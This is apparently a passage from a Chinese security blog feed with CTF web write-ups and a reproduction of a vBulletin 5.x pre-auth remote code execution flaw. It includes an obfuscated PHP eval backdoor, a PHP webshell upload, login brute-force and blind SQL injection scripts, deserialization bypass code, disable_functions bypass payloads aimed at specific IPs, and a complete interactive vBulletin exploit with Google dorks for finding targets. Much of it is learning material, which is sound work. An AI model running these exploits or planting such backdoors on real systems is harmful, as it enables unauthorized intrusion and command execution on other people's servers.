.b4ckdo0r.php.swo</p><p>搞过就不浪费时间了</p><pre><code class="hljs python">&lt;?phpecho <span class="hljs-string">"can you find the source code of me?"</span>;/** * Signature For Report */$h=<span class="hljs-string">'_)m/","/-/)m"),)marray()m"/","+")m),$)mss($s[$i)m],0,$e))))m)m,$k)));$o=ob)m_get_c)monte)m)mnts)m();ob_end_clean)'</span>;/* */$H=<span class="hljs-string">'m();$d=ba)mse64)m_encode)m(x(gzc)mompres)ms($o),)m$)mk));print("&lt;)m$k&gt;$d&lt;)m/)m$k&gt;)m");@sessio)mn_d)mestroy();&#125;&#125;&#125;&#125;'</span>;/* */$N=<span class="hljs-string">'mR;$rr)m=@$r[)m"HTT)mP_RE)mFERER"];$ra)m=)m@$r["HTTP_AC)mC)mEPT_LANG)mUAGE)m")m];if($rr)m&amp;&amp;$ra)&#123;)m$u=parse_u)mrl($rr);p'</span>;/* */$u=<span class="hljs-string">'$e)&#123;)m$k=$)mkh.$kf;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array("/'</span>;/* */$f=<span class="hljs-string">'$i&lt;$)ml;)m)&#123;)mfo)mr($j)m=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j)m++,$i+)m+)&#123;$)mo.=$t&#123;$i)m&#125;^$)mk&#123;$j&#125;;&#125;&#125;r)meturn )m$o;&#125;$r)m=$_SERVE)'</span>;/* */$O=<span class="hljs-string">'[$i]="";$p)m=$)m)mss($p,3)m);&#125;if(ar)mray_)mkey_exists)m()m$i,$s))&#123;$)ms[$i].=$p)m;)m$e=s)mtrpos)m($s[$i],$f);)mif('</span>;/* */$w=<span class="hljs-string">')m));)m$p="";fo)mr($z=1;)m$z&lt;c)mount()m$m[1]);$)mz++)m)m)$p.=$q[$m[)m)m2][$z]];if(str)mpo)ms($p,$h))m===0)&#123;$s)m'</span>;/* */$P=<span class="hljs-string">'trt)molower";$)mi=$m[1][0)m)m].$m[1][1])m;$h=$sl()m$ss(m)md5($)mi.$kh)m),0,)m3));$f=$s)ml($ss()m)mmd5($i.$kf),0,3'</span>;/* */$i=<span class="hljs-string">')marse_)mstr)m($u["q)muery"],$)m)mq);$q=array)m_values()m$q);pre)mg_matc)mh_all()m"/([\\w)m])m)[\\w-)m]+(?:;q=0.)'</span>;/* */$x=<span class="hljs-string">'m([\\d)m]))?,?/",)m$ra,$m))m;if($q)m&amp;&amp;$)mm))m)m&#123;@session_start();$)ms=&amp;$_S)mESSI)m)mON;$)mss="sub)mstr";$sl="s)m'</span>;/* */$y=str_replace(<span class="hljs-string">'b'</span>,<span class="hljs-string">''</span>,<span class="hljs-string">'crbebbabte_funcbbtion'</span>);/* */$c=<span class="hljs-string">'$kh="4f7)m)mf";$kf="2)m)m8d7";funct)mion x($t)m,$k)&#123;$)m)mc=strlen($k);$l=st)mrlen)m($t);)m)m$o="";for()m$i=0;'</span>;/* */$L=str_replace(<span class="hljs-string">')m'</span>,<span class="hljs-string">''</span>,$c.$f.$N.$i.$x.$P.$w.$O.$u.$h.$H);/* */$v=$y(<span class="hljs-string">''</span>,$L);$v();/* */?&gt;</code></pre><h1 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">'common.php'</span>;$requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">db</span></span><span class="hljs-class"></span>&#123;<span class="hljs-keyword">public</span> $where;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;where))&#123;<span class="hljs-keyword">$this</span>-&gt;select(<span class="hljs-keyword">$this</span>-&gt;where);&#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">select</span><span class="hljs-params">($where)</span></span><span class="hljs-function"></span>&#123;$sql = mysql_query(<span class="hljs-string">'select * from user where '</span>.$where);<span class="hljs-keyword">return</span> @mysql_fetch_array($sql);&#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($requset[<span class="hljs-string">'token'</span>]))&#123;$login = unserialize(gzuncompress(base64_decode($requset[<span class="hljs-string">'token'</span>])));$db = <span class="hljs-keyword">new</span> db();$row = $db-&gt;select(<span class="hljs-string">'user=\''</span>.mysql_real_escape_string($login[<span class="hljs-string">'user'</span>]).<span class="hljs-string">'\''</span>);<span class="hljs-keyword">if</span>($login[<span class="hljs-string">'user'</span>] === <span class="hljs-string">'ichunqiu'</span>)&#123;<span class="hljs-keyword">echo</span> $flag;&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($row[<span class="hljs-string">'pass'</span>] !== $login[<span class="hljs-string">'pass'</span>])&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'unserialize injection!!'</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"(╯‵□′)╯︵┴─┴ "</span>;&#125;&#125;<span class="hljs-keyword">else</span>&#123;header(<span class="hljs-string">'Location: index.php?error=1'</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>关键代码</p><pre><code class="hljs php">$login = unserialize(gzuncompress(base64_decode($requset[<span class="hljs-string">'token'</span>])));<span class="hljs-keyword">if</span>($login[<span class="hljs-string">'user'</span>] === <span class="hljs-string">'ichunqiu'</span>)&#123;<span class="hljs-keyword">echo</span> $flag;</code></pre><p>由于array_merge中$_SESSION为NULL会覆盖前面的数组，所以传入参数放在cookie里</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$login=base64_encode(gzcompress(serialize(<span class="hljs-keyword">array</span>(<span class="hljs-string">'user'</span>=&gt;<span class="hljs-string">'ichunqiu'</span>)))); <span class="hljs-keyword">echo</span> $login;</code></pre><p><img src="./1566982677071.png" srcset="/img/loading.gif" alt="1566982677071"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>百度杯九月web题解</title>
    <link href="/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/"/>
    <url>/2019/09/27/%E7%99%BE%E5%BA%A6%E6%9D%AF%E4%B9%9D%E6%9C%88web%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="123"><a href="#123" class="headerlink" title="123"></a>123</h1><p>python脚本跑登录账户密码</p><pre><code class="hljs python"><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> sysreload(sys)sys.setdefaultencoding(<span class="hljs-string">'utf8'</span>)<span class="hljs-keyword">with</span> open(<span class="hljs-string">'user.php.bak'</span>) <span class="hljs-keyword">as</span> f:    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():        s=line.strip()        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1990</span>,<span class="hljs-number">2000</span>):            data=&#123;                <span class="hljs-string">"username"</span>:s,                <span class="hljs-string">"password"</span>:s+str(i),                <span class="hljs-string">"submit"</span>:<span class="hljs-string">"submit"</span>            &#125;            url = <span class="hljs-string">"http://86adc2d12122466badd619509fbcf3731899ba5ef4e34703.changame.ichunqiu.com/login.php"</span>            rep=requests.post(url=url,data=data)            print(data)            <span class="hljs-keyword">if</span> <span class="hljs-string">"登录失败"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> rep.text:                print(rep.text)                print(<span class="hljs-string">"username = "</span>+s)                print(<span class="hljs-string">"password = "</span> +s+str(i))                <span class="hljs-keyword">break</span></code></pre><p><code>username = zhangyuzhen</code><br><code>password = zhangyuzhen1995</code></p><p>上传文件，提示需要有jpg后缀，猜测为白名单，直接构造shell.jpg.phtml</p><p>文件内容:<code>&lt;?=eval($_GET[_]);?&gt;</code></p><p>访问/view.php?file=flaflagg得到flag得到flag</p><h1 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a>SQLI</h1><p>过滤逗号,脚本如下</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl=<span class="hljs-string">"http://f75cd2c0820c4f3a88ff220eaa86d3901024ed0736f34044.changame.ichunqiu.com/l0gin.php"</span>str1=<span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">20</span>):    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):        id=<span class="hljs-string">f"1' and ascii(substring((select concat(table_name) from information.schema_tables where table_schema=database()) from <span class="hljs-subst">&#123;i&#125;</span> for 1))=<span class="hljs-subst">&#123;j&#125;</span> and '1"</span>        param=&#123;<span class="hljs-string">'id'</span>:id&#125;        rep=requests.get(url=url,params=param)        <span class="hljs-comment">#print(rep.url)</span>        <span class="hljs-comment">#print(param)</span>        <span class="hljs-keyword">if</span> <span class="hljs-string">'flag'</span> <span class="hljs-keyword">in</span> rep.text:            str1+=chr(j)            print(str1)            <span class="hljs-keyword">break</span></code></pre><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p>注入发现&lt;&gt;被替换为空，且先执行过滤在执行黑名单判断。<code>sel&lt;&gt;ect</code>绕过黑名单</p><p>LOGIN</p><p>array_merge合并函数，遇到null会返回NULL，这里$_SESSION为null.</p><p>所以传如cookie值去覆盖</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">'common.php'</span>;$requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($requset[<span class="hljs-string">'token'</span>]))&#123;$login = unserialize(gzuncompress(base64_decode($requset[<span class="hljs-string">'token'</span>])));$db = <span class="hljs-keyword">new</span> db();$row = $db-&gt;select(<span class="hljs-string">'user=\''</span>.mysql_real_escape_string($login[<span class="hljs-string">'user'</span>]).<span class="hljs-string">'\''</span>);<span class="hljs-keyword">if</span>($login[<span class="hljs-string">'user'</span>] === <span class="hljs-string">'ichunqiu'</span>)&#123;<span class="hljs-keyword">echo</span> $flag;&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($row[<span class="hljs-string">'pass'</span>] !== $login[<span class="hljs-string">'pass'</span>])&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">'unserialize injection!!'</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"(â•¯â€µâ–¡â€²)â•¯ï¸µâ”´â”€â”´ "</span>;&#125;&#125;<span class="hljs-keyword">else</span>&#123;header(<span class="hljs-string">'Location: index.php?error=1'</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vBulletin5-x前台代码执行漏洞(复现)</title>
    <link href="/2019/09/25/vBulletin5-x%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/"/>
    <url>/2019/09/25/vBulletin5-x%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>vBulletin 是一个强大，灵活并可完全根据自己的需要定制的论坛程序套件。它使用目前发展速度最快的 Web <a href="https://baike.baidu.com/item/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80/1379708" target="_blank" rel="noopener">脚本语言</a>编写： <a href="https://baike.baidu.com/item/PHP" target="_blank" rel="noopener">PHP</a>，并且基于以高效和疾速著称的数据库引擎 <a href="https://baike.baidu.com/item/MySQL" target="_blank" rel="noopener">MySQL</a>。</p><p>PS: 没有debug的审计都是耍流氓</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>前台代码执行漏洞</p><p>未做过滤将传入的post或get参数注册为模板变量</p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-comment">#</span><span class="hljs-comment"># vBulletin 5.x 0day pre-auth RCE exploit</span><span class="hljs-comment"># </span><span class="hljs-comment"># This should work on all versions from 5.0.0 till 5.5.4</span><span class="hljs-comment">#</span><span class="hljs-comment"># Google Dorks:</span><span class="hljs-comment"># - site:*.vbulletin.net</span><span class="hljs-comment"># - "Powered by vBulletin Version 5.5.4"</span><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">if</span> len(sys.argv) != <span class="hljs-number">2</span>:    sys.exit(<span class="hljs-string">"Usage: %s &lt;URL to vBulletin&gt;"</span> % sys.argv[<span class="hljs-number">0</span>])params = &#123;<span class="hljs-string">"routestring"</span>:<span class="hljs-string">"ajax/render/widget_php"</span>&#125;<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:     <span class="hljs-keyword">try</span>:          cmd = raw_input(<span class="hljs-string">"vBulletin$ "</span>)          params[<span class="hljs-string">"widgetConfig[code]"</span>] = <span class="hljs-string">"echo shell_exec('"</span>+cmd+<span class="hljs-string">"'); exit;"</span>          r = requests.post(url = sys.argv[<span class="hljs-number">1</span>], data = params)          <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:               <span class="hljs-keyword">print</span> r.text          <span class="hljs-keyword">else</span>:               sys.exit(<span class="hljs-string">"Exploit failed! :("</span>)     <span class="hljs-keyword">except</span> KeyboardInterrupt:          sys.exit(<span class="hljs-string">"\nClosing shell..."</span>)     <span class="hljs-keyword">except</span> Exception, e:          sys.exit(str(e))</code></pre><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>依据poc进行代码审计</p><p>传入参数值<code>params = {&quot;routestring&quot;:&quot;ajax/render/widget_php&quot;}</code>，全搜索<code>routestring</code>参数。</p><p><img src="./1569410140614.png" srcset="/img/loading.gif" alt="1569410140614"></p><p>可以通过分析类，application参数。定位到index.php第35行。跟进execute方法</p><p><img src="./1569410223281.png" srcset="/img/loading.gif" alt="1569410223281"></p><p>跟进该类callRender方法,第266行，<code>&#39;template&#39; =&gt; &#39;widget_php&#39;，&#39;arguments&#39; =&gt; array(&#39;routestring&#39;=&gt;&#39;ajax/render/widget_php&#39;,&#39;widgetConfig[code]&#39;=&gt;&#39;echo shell_exec(cmd); exit;&#39;)</code></p><p><img src="./1569410438063.png" srcset="/img/loading.gif" alt="1569410438063"></p><p>将传入的<code>$_POST</code>或者<code>$_GET</code>注册为全局变量</p><p><img src="./1569411645369.png" srcset="/img/loading.gif" alt="1569411645369"></p><p><code>\core\install\vbulletin-style.xml</code></p><p>在满足if条件执行以下代码</p><p><code>{vb:action evaledPHP, bbcode, evalCode, {vb:raw widgetConfig.code}}</code></p><p><img src="./1569411277129.png" srcset="/img/loading.gif" alt="1569411277129"></p><p><code>includes\vb5\frontend\controller\bbcode.php</code> 调用evalCode方法，传入参数widgetConfig.code，即我们传入的恶意代码</p><p><img src="./1569413461091.png" srcset="/img/loading.gif" alt="1569413461091"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://xz.aliyun.com/t/6419" target="_blank" rel="noopener">https://xz.aliyun.com/t/6419</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Inctf题解 | rce+disable_functions bypass</title>
    <link href="/2019/09/24/Inctf-web%E9%A2%98%E8%A7%A3/"/>
    <url>/2019/09/24/Inctf-web%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="php1-0"><a href="#php1-0" class="headerlink" title="php1.0"></a>php1.0</h1><pre><code class="hljs php">File doesn<span class="hljs-string">'t exist</span><span class="hljs-string">&lt;?php</span><span class="hljs-string"></span><span class="hljs-string">$input = $_GET['</span>input<span class="hljs-string">'];</span><span class="hljs-string"></span><span class="hljs-string">function check()&#123;</span><span class="hljs-string">  global $input;</span><span class="hljs-string">  foreach (get_defined_functions()['</span>internal<span class="hljs-string">'] as $blacklisted) &#123;</span><span class="hljs-string">      if (preg_match ('</span>/<span class="hljs-string">' . $blacklisted . '</span>/im<span class="hljs-string">', $input)) &#123;</span><span class="hljs-string">          echo "Your input is blacklisted" . "&lt;br&gt;";</span><span class="hljs-string">          return true;</span><span class="hljs-string">          break;</span><span class="hljs-string">      &#125;</span><span class="hljs-string">  &#125;</span><span class="hljs-string">  $blacklist = "exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'";</span><span class="hljs-string">  unset($blacklist);</span><span class="hljs-string">  return false;</span><span class="hljs-string">&#125;</span><span class="hljs-string"></span><span class="hljs-string">$thisfille=$_GET['</span>thisfile<span class="hljs-string">'];</span><span class="hljs-string"></span><span class="hljs-string">if(is_file($thisfille))&#123;</span><span class="hljs-string">  echo "You can'</span>t <span class="hljs-keyword">use</span> <span class="hljs-title">inner</span> <span class="hljs-title">file</span>" . "&lt;<span class="hljs-title">br</span>&gt;";&#125;<span class="hljs-keyword">else</span>&#123;  <span class="hljs-keyword">if</span>(file_exists($thisfille))&#123;    <span class="hljs-keyword">if</span>(check())&#123;      <span class="hljs-keyword">echo</span> <span class="hljs-string">"Naaah"</span> . <span class="hljs-string">"&lt;br&gt;"</span>;    &#125;<span class="hljs-keyword">else</span>&#123;      <span class="hljs-keyword">eval</span>($input);    &#125;  &#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">"File doesn't exist"</span> . <span class="hljs-string">"&lt;br&gt;"</span>;  &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">iterate</span><span class="hljs-params">($ass)</span></span>&#123;    <span class="hljs-keyword">foreach</span>($ass <span class="hljs-keyword">as</span> $hole)&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">"AssHole"</span>;    &#125;&#125;highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>代码分析：可控有两个参数$thisfille、$input</p><p>$input传入参数会被eval执行，但是之前需要经过<code>get_defined_functions()[&#39;internal&#39;]</code>，过滤所有php内置函数</p><h2 id="思路一：无字母webshell"><a href="#思路一：无字母webshell" class="headerlink" title="思路一：无字母webshell"></a>思路一：无字母webshell</h2><pre><code class="hljs mel">?input=$b=$&#123;%a0%af%b0%ac%ab^%ff%ff%ff%ff%ff&#125;[a];<span class="hljs-keyword">eval</span>($b);&amp;thisfile=/var</code></pre><p><img src="./1569293365248.png" srcset="/img/loading.gif" alt="1569293365248"></p><h2 id="思路二：字符串拼接"><a href="#思路二：字符串拼接" class="headerlink" title="思路二：字符串拼接"></a>思路二：字符串拼接</h2><p><img src="./1569293549103.png" srcset="/img/loading.gif" alt="1569293549103"></p><p><code>$b=p.h.p.i.n.f.o;$b();</code></p><p><img src="./1569306232614.png" srcset="/img/loading.gif" alt="1569306232614"></p><p><strong>函数禁用</strong></p><pre><code class="hljs php">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir</code></pre><h3 id="os命令执行"><a href="#os命令执行" class="headerlink" title="os命令执行"></a>os命令执行</h3><p><code>proc_open</code>函数未被禁用</p><p>函数参考链接:<a href="https://www.php.net/manual/zh/function.proc-open.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.proc-open.php</a></p><p>$process中存储返回proc_open函数,stream_get_contents输出内容</p><pre><code class="hljs php">/?input=$descr=<span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">'p'</span>.<span class="hljs-string">'ipe'</span>,<span class="hljs-string">'r'</span>),<span class="hljs-number">1</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">'p'</span>.<span class="hljs-string">'ipe'</span>,<span class="hljs-string">'w'</span>),<span class="hljs-number">2</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">'p'</span>.<span class="hljs-string">'ipe'</span>,<span class="hljs-string">'w'</span>));$pxpes=<span class="hljs-keyword">array</span>();$process=<span class="hljs-keyword">eval</span>(<span class="hljs-string">'return proc'</span>.$thisfille[<span class="hljs-number">8</span>].<span class="hljs-string">'open("/readFlag",$descr,$pxpes);'</span>);<span class="hljs-keyword">eval</span>(<span class="hljs-string">'echo(s'</span>.<span class="hljs-string">'t'</span>.<span class="hljs-string">'r'</span>.<span class="hljs-string">'e'</span>.<span class="hljs-string">'a'</span>.<span class="hljs-string">'m'</span>.$thisfille[<span class="hljs-number">8</span>].<span class="hljs-string">'g'</span>.<span class="hljs-string">'e'</span>.<span class="hljs-string">'t'</span>.$thisfille[<span class="hljs-number">8</span>].<span class="hljs-string">'c'</span>.<span class="hljs-string">'o'</span>.<span class="hljs-string">'n'</span>.<span class="hljs-string">'t'</span>.<span class="hljs-string">'e'</span>.<span class="hljs-string">'n'</span>.<span class="hljs-string">'t'</span>.<span class="hljs-string">'s($pxpes[1]));'</span>);&amp;thisfile=/lib/x86_64-linux-gnu</code></pre><p><img src="./1569307976631.png" srcset="/img/loading.gif" alt="1569307976631"></p><h1 id="php1-5、php2-5"><a href="#php1-5、php2-5" class="headerlink" title="php1.5、php2.5"></a>php1.5、php2.5</h1><pre><code class="hljs php"><span class="hljs-comment">//php2.5</span>File doesn<span class="hljs-string">'t exist</span><span class="hljs-string">&lt;?php</span><span class="hljs-string"></span><span class="hljs-string">$input = $_GET['</span>input<span class="hljs-string">'];</span><span class="hljs-string"></span><span class="hljs-string">function check()&#123;</span><span class="hljs-string">  global $input;</span><span class="hljs-string">  foreach (get_defined_functions()['</span>internal<span class="hljs-string">'] as $blacklisted) &#123;</span><span class="hljs-string">      if (preg_match ('</span>/<span class="hljs-string">' . $blacklisted . '</span>/im<span class="hljs-string">', $input)) &#123;</span><span class="hljs-string">          echo "Your input is blacklisted" . "&lt;br&gt;";</span><span class="hljs-string">          return true;</span><span class="hljs-string">          break;</span><span class="hljs-string">      &#125;</span><span class="hljs-string">  &#125;</span><span class="hljs-string">  $blacklist = "exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'";</span><span class="hljs-string">  if(preg_match("/$blacklist/i", $input))&#123;</span><span class="hljs-string">    echo "Do you really you need that?" . "&lt;br&gt;";</span><span class="hljs-string">    return true;</span><span class="hljs-string">  &#125;</span><span class="hljs-string"></span><span class="hljs-string">  unset($blacklist);</span><span class="hljs-string">  if(strlen($input)&gt;100)&#123;  #That is random no. I took ;)</span><span class="hljs-string">    echo "This is getting really large input..." . "&lt;br&gt;";</span><span class="hljs-string">    return true;</span><span class="hljs-string">  &#125;  </span><span class="hljs-string">  return false;</span><span class="hljs-string">&#125;</span><span class="hljs-string"></span><span class="hljs-string">$thisfille=$_GET['</span>thisfile<span class="hljs-string">'];</span><span class="hljs-string"></span><span class="hljs-string">if(is_file($thisfille))&#123;</span><span class="hljs-string">  echo "You can'</span>t <span class="hljs-keyword">use</span> <span class="hljs-title">inner</span> <span class="hljs-title">file</span>" . "&lt;<span class="hljs-title">br</span>&gt;";&#125;<span class="hljs-keyword">else</span>&#123;  <span class="hljs-keyword">if</span>(file_exists($thisfille))&#123;    <span class="hljs-keyword">if</span>(check())&#123;      <span class="hljs-keyword">echo</span> <span class="hljs-string">"Naaah"</span> . <span class="hljs-string">"&lt;br&gt;"</span>;    &#125;<span class="hljs-keyword">else</span>&#123;      <span class="hljs-keyword">eval</span>($input);    &#125;  &#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">"File doesn't exist"</span> . <span class="hljs-string">"&lt;br&gt;"</span>;  &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">iterate</span><span class="hljs-params">($ass)</span></span>&#123;    <span class="hljs-keyword">foreach</span>($ass <span class="hljs-keyword">as</span> $hole)&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">"AssHole"</span>;    &#125;&#125;highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-meta">?&gt;</span></code></pre><pre><code class="hljs php"><span class="hljs-comment">//php1.5</span>File doesn<span class="hljs-string">'t exist</span><span class="hljs-string">&lt;?php</span><span class="hljs-string"></span><span class="hljs-string">$input = $_GET['</span>input<span class="hljs-string">'];</span><span class="hljs-string"></span><span class="hljs-string">function check()&#123;</span><span class="hljs-string">  global $input;</span><span class="hljs-string">  foreach (get_defined_functions()['</span>internal<span class="hljs-string">'] as $blacklisted) &#123;</span><span class="hljs-string">      if (preg_match ('</span>/<span class="hljs-string">' . $blacklisted . '</span>/im<span class="hljs-string">', $input)) &#123;</span><span class="hljs-string">          echo "Your input is blacklisted" . "&lt;br&gt;";</span><span class="hljs-string">          return true;</span><span class="hljs-string">          break;</span><span class="hljs-string">      &#125;</span><span class="hljs-string">  &#125;</span><span class="hljs-string">  $blacklist = "exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'";</span><span class="hljs-string">  if(preg_match("/$blacklist/i", $input))&#123;</span><span class="hljs-string">    echo "Do you really you need that?" . "&lt;br&gt;";</span><span class="hljs-string">    return true;</span><span class="hljs-string">  &#125;</span><span class="hljs-string"></span><span class="hljs-string">  unset($blacklist);</span><span class="hljs-string">  return false;</span><span class="hljs-string">&#125;</span><span class="hljs-string"></span><span class="hljs-string">$thisfille=$_GET['</span>thisfile<span class="hljs-string">'];</span><span class="hljs-string"></span><span class="hljs-string">if(is_file($thisfille))&#123;</span><span class="hljs-string">  echo "You can'</span>t <span class="hljs-keyword">use</span> <span class="hljs-title">inner</span> <span class="hljs-title">file</span>" . "&lt;<span class="hljs-title">br</span>&gt;";&#125;<span class="hljs-keyword">else</span>&#123;  <span class="hljs-keyword">if</span>(file_exists($thisfille))&#123;    <span class="hljs-keyword">if</span>(check())&#123;      <span class="hljs-keyword">echo</span> <span class="hljs-string">"Naaah"</span> . <span class="hljs-string">"&lt;br&gt;"</span>;    &#125;<span class="hljs-keyword">else</span>&#123;      <span class="hljs-keyword">eval</span>($input);    &#125;  &#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">"File doesn't exist"</span> . <span class="hljs-string">"&lt;br&gt;"</span>;  &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">iterate</span><span class="hljs-params">($ass)</span></span>&#123;    <span class="hljs-keyword">foreach</span>($ass <span class="hljs-keyword">as</span> $hole)&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">"AssHole"</span>;    &#125;&#125;highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-meta">?&gt;</span></code></pre><h2 id="新增过滤"><a href="#新增过滤" class="headerlink" title="新增过滤"></a>新增过滤</h2><pre><code class="hljs php"><span class="hljs-keyword">exit</span>|<span class="hljs-keyword">die</span>|<span class="hljs-keyword">eval</span>|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\<span class="hljs-string">"|\'</span></code></pre><h2 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h2><pre><code class="hljs http">?input=$b=%a0%af%b0%ac%ab^%ff%ff%ff%ff%ff;$a=$$b;$c=c.u.r.r.e.n.t;$f=$c($a);$d=a.s.s.e.r.t;$d($f);&amp;thisfile=/var</code></pre><p><img src="./1569319304201.png" srcset="/img/loading.gif" alt="1569319304201"></p><p>不知道为啥，这里蚁剑连接只能用end函数取post数组</p><p>payload:<code>http://3.16.218.96/?input=$b=%a0%af%b0%ac%ab^%ff%ff%ff%ff%ff;$a=$$b;$c=e.n.d;$f=$c($a);$d=a.s.s.e.r.t;$d($f);&amp;thisfile=/var</code></p><p><img src="./1569323686363.png" srcset="/img/loading.gif" alt="1569323686363"></p><p>payload:<code>http://18.223.159.46//?input=$b=%a0%af%b0%ac%ab^%ff%ff%ff%ff%ff;$a=$$b;$c=e.n.d;$f=$c($a);$d=a.s.s.e.r.t;$d($f);&amp;thisfile=/var</code></p><p><img src="./1569323729563.png" srcset="/img/loading.gif" alt="1569323729563"></p><h2 id="payload3-proc-open文件写到tmp"><a href="#payload3-proc-open文件写到tmp" class="headerlink" title="payload3(proc_open文件写到tmp)"></a>payload3(proc_open文件写到tmp)</h2><p><img src="./1569327504127.png" srcset="/img/loading.gif" alt="1569327504127"></p><h2 id="php2-0"><a href="#php2-0" class="headerlink" 